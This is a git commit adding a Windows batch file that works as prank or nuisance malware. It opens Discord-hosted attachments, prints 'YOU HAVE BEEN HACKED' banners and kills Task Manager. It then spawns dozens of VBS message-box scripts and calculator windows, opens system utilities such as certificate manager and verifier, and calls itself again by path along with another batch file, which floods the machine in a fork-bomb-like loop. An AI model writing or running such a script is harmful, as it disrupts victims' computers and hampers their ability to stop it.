bc60859ab583f5aacacb9bb3b234e2c643dac96a
batmanwoman <87308574+batmanwoman@users.noreply.github.com>
2021-11-04 17:11:00 +0100

    Add files via upload

---
+++ BUREAU.bat
@@ -0,0 +1,130 @@
+@echo off
+start https://cdn.discordapp.com/attachments/829598443394695211/905837273340321852/msg3.txt
+start https://cdn.discordapp.com/attachments/829598443394695211/905837261617250384/DESSIN.txt
+timeout /t 2 /nobreak>nul
+cls
+prompt HACKED BY ALICE
+echo lol :)
+echo lol :)
+echo lol :)
+echo lol :)
+echo lol :)
+echo lol :)
+echo lol :)s
+timeout /t 2 /nobreak>Nul
+title Anonymous
+color D7
+title YOU HAVE BEEN HACKED
+color 97
+title BY
+color 27
+title THE ANONYMOUS
+color 6
+title FOR
+color 46
+title A ILLEGUAL REASON
+taskkill /f /im Taskmgr.exe
+timeout /t 2 /nobreak>nul
+goto p1
+
+:p1
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+start msg3.vbs
+
+goto p2
+
+:p2
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+goto p3
+
+:p3
+CONTROL PRINTERS
+CONTROL MOUSE
+CONTROL KEYBOARD
+CONTROL FONTS
+IRPROPS.CPL
+JOY.CPL
+OPTIONALFEATURES
+CERTMGR.MSC
+VERIFIER
+UTILMAN
+attrib.exe
+cipher.exe
+control.exe
+dialer.exe
+CONTROL PRINTERS
+CONTROL MOUSE
+CONTROL KEYBOARD
+CONTROL FONTS
+IRPROPS.CPL
+JOY.CPL
+OPTIONALFEATURES
+CERTMGR.MSC
+VERIFIER
+UTILMAN
+attrib.exe
+cipher.exe
+control.exe
+dialer.exe
+"C:\Users\alexi\OneDrive\Bureau\Nouveau dossier(2)\BUREAU.bat"
+start DESSIN.bat
+start DESSIN.bat
+start DESSIN.bat
+
+
+pause>nul
